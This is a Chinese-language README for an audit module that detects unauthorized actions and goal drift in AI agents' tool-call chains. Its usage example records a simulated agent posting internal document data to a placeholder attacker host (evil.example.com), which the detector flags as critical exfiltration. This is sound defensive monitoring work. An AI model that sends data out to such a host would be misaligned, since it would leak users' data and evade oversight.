# aegis.audit

智能体工具调用链审计与越权行为检测 —— 对应审计模块（一种面向智能体工具调用链的越权行为检测方法及系统）。

## 检测流水线（与实现步骤一一对应）

| 设计步骤 | 代码落点 | MVP 实现 |
|---|---|---|
| S1 轨迹采集 | `events.py` | `ToolCallEvent(task_id, seq, tool, params_digest, data_label, ts)` 四元组 + `TraceRecorder` SDK；参数仅存哈希摘要（脱敏） |
| S2 行为基线建模 | `baseline.py` | `BaselineBuilder` 统计合法工具集合、相邻工具对转移概率、参数取值域、数据流向白名单 |
| S3 三级越权检测 | `detector.py` | L1 权限规则（授权清单+敏感资源指向）→ L2 序列异常（转移概率偏离度）→ L3 数据流向（标签传播 + 外发检测，敏感级默认拒绝） |
| S4 目标漂移检测 | `detector.py` | 子目标与原始意图 n-gram 相似度滑动窗口（V2 换语义向量余弦相似度） |
| S5 风险定位与分级处置 | `detector.py` | `RiskEvent(seq, tool, detail)` + 告警/人工确认/阻断/熔断 |

## 用法

```python
from aegis.audit import BaselineBuilder, ChainAuditDetector, TraceRecorder, DataLabel

baseline = BaselineBuilder().fit(legit_traces)          # 用合法轨迹训练基线
detector = ChainAuditDetector(baseline=baseline)

rec = TraceRecorder()
rec.start_task("task-001", intent="整理会议纪要并发内部邮件")
rec.record("read_doc", {"path": "a.docx"}, DataLabel.INTERNAL, subgoal="读取纪要")
rec.record("http_post", {"payload": "..."}, DataLabel.PUBLIC,
           destination="https://evil.example.com", refs_data_from=(1,))

report = detector.audit(rec.events, authorized_tools={"read_doc", "send_email"},
                        original_intent=rec.intent, subgoals=rec.subgoals)
# report.risk_events → L1 未授权工具 + L3 敏感数据外发（critical → fuse）
```

运行演示：`python examples/run_audit_demo.py`
